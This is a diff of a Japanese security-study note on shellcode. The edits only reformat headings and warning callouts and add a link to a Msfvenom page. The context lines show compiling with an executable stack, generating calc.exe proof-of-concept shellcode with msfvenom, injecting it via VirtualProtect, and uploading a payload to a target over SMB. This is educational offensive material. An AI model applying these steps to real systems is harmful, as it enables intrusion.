@@ -168,17 +168,17 @@ int main(int argc, char **argv) {
 ```zsh
 gcc -g -Wall -z execstack example.c -o examplex
 ```
-
 - `-g`：デバッグ情報を生成
 - `-Wall`：警告メッセージを表示
 - `-z execstack`：スタック上で実行可能なコードを許可
 
 ---
 
-## シェルコードの生成と注入
+# シェルコードの生成と注入
 
-### 公開ツールを使ったシェルコード生成（msfvenom）
+## 公開ツールを使ったシェルコード生成（msfvenom）
 
+[☠️Msfvenom](../../Tools/☠️Msfvenom.md)
 ```zsh
 # calc.exeを実行するシェルコード（PoC用途）
 msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
@@ -188,9 +188,10 @@ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/ex
 xxd -i /tmp/example.bin
 ```
 
-> [!WARNING] 公開ツールで生成されるシェルコードの多くは、AVに既知のパターンとして認識され容易に検出される。
+> [!WARNING]
+> 公開ツールで生成されるシェルコードの多くは、AVに既知のパターンとして認識され容易に検出される。
 
-### シェルコード注入（VirtualProtect経由）
+## シェルコード注入（VirtualProtect経由）
 
 生成したシェルコードをメモリ上に配置し、`VirtualProtect`で実行権限を付与して関数ポインタ経由で実行する。
 
@@ -219,4 +220,5 @@ smbclient -U example '//<target_IP>/Tools'
 smb: \> put calc-MSF.exe
 ```
 
-> [!WARNING] 多くの場合、AntiScanなどでAVに検出される。
+> [!WARNING]
+> 多くの場合、AntiScanなどでAVに検出される。
